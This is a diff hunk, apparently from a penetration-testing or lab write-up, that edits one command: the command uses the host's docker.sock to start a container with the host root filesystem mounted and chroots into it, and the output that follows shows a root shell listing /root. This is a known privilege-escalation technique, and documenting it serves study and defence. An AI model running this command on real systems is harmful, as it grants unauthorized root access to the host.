@@ -51,7 +51,7 @@ REPOSITORY                           TAG                 IMAGE ID       CREATED 
 ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
 
 # using docker.sock to create a new container with access to / root and accessing it as chroot directory
-$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu:20.04 chroot /mnt bash
 
 root@8d891f1f02a7:/# ls -lha /root
 total 44K
